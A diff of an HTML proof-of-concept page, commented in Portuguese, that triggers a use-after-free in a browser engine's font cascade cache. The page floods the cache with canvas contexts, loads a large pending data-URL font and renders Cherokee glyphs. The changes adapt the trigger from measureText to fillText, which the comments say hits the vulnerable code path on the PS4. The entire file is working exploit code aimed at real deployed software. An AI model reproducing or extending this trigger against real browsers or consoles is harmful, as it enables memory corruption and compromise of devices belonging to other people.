@@ -1,25 +1,28 @@
-
 <!DOCTYPE html>
 <html>
 <head>
     <meta charset="utf-8">
-    <title>PoC - Fiel ao Commit (FontCascadeCache Prune UAF)</title>
+    <title>PoC - Main Thread drawTextInternal Adaptation</title>
 </head>
 <body>
 <script>
-    // 1. Satura o cache de fontes para forçar o prune inline (3500 contextos)
-    const dummies = [];
-    for (let i = 0; i < 3500; i++) {
-        const dummy = document.createElement('canvas').getContext('2d');
-        dummy.font = '10px "dummy' + i + '"';
-        dummies.push(dummy);
-    }
+// 1. Satura o FontCascadeCache (3500 contextos de canvas) para forçar o prune inline
+const dummies = [];
+for (let i = 0; i < 3500; i++) {
+    const dummy = document.createElement('canvas').getContext('2d');
+    dummy.font = '10px "dummy' + i + '"';
+    dummies.push(dummy);
+}
 
-    // 2. Cria a fonte pendente grande para o reentrancy window
-    const pendingFontURL = 'url("data:font/ttf;base64,' + 'A'.repeat(1100000) + '")';
+// 2. Fonte de >= 1MB data: URL para manter o estado pendente até o glyph walk
+const pendingFontURL = 'url("data:font/ttf;base64,' + 'A'.repeat(1100000) + '")';
 
-    const metricsDonor = new FontFace('metricsDonor', pendingFontURL);
-    const measured = new FontFace('measured', pendingFontURL, { unicodeRange: 'U+13A0-13FF' });
+const keepAlive = [];
+for (let attempt = 0; attempt < 2; attempt++) {
+    // metricsDonor cobre U+0020 (primária)
+    const metricsDonor = new FontFace('metricsDonor' + attempt, pendingFontURL);
+    // measured cobre o intervalo Cherokee U+13A0-13FF
+    const measured = new FontFace('measured' + attempt, pendingFontURL, { unicodeRange: 'U+13A0-13FF' });
     
     document.fonts.add(metricsDonor);
     document.fonts.add(measured);
@@ -27,17 +30,22 @@
     const canvas = document.createElement('canvas');
     canvas.width = 64;
     canvas.height = 64;
-    const context = canvas.getContext('2d');
+    canvas.style.position = 'absolute';
+    canvas.style.left = '-9999px';
+    document.body.appendChild(canvas);
     
-    context.font = '10px metricsDonor, measured';
+    const context = canvas.getContext('2d');
+    context.font = '10px metricsDonor' + attempt + ', measured' + attempt;
+    keepAlive.push(metricsDonor, measured, context);
 
-    // 3. Dispara o glyph walk com os caracteres Cherokee (\u13A0\u13A2\u13A4)
-    // para acionar o CodePath::Simple e forçar o UAF no FontCascadeFonts primário.
+    // 3. ADAPTAÇÃO CHAVE: Em vez de measureText, chamamos fillText() 
+    // para acionar drawTextInternal() e atingir o padrão vulnerável de fontMetrics no PS4.
     try {
-        context.measureText('\u13A0\u13A2\u13A4');
+        context.fillText('\u13A0\u13A2\u13A4', 10, 10);
     } catch (e) {
         console.error(e);
     }
+}
 </script>
 </body>
 </html>
